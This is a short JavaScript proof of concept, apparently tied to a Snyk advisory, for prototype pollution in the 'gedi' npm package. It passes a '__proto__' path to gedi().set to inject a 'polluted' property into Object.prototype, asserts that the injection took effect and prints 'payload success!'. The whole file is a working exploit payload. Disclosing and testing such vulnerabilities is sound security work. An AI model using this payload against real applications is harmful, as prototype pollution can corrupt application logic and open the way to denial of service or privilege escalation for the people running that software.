//https://snyk.io/vuln/SNYK-JS-GEDI-598803
const gedi = require('gedi');
const { assert } = require("@firebase/util");

var obj = {}
console.log("Before : " + obj.polluted);
gedi().set('[__proto__/polluted]', "yes");

console.log("After : " + obj.polluted);
assert({}.polluted === "yes");
console.log("payload success!");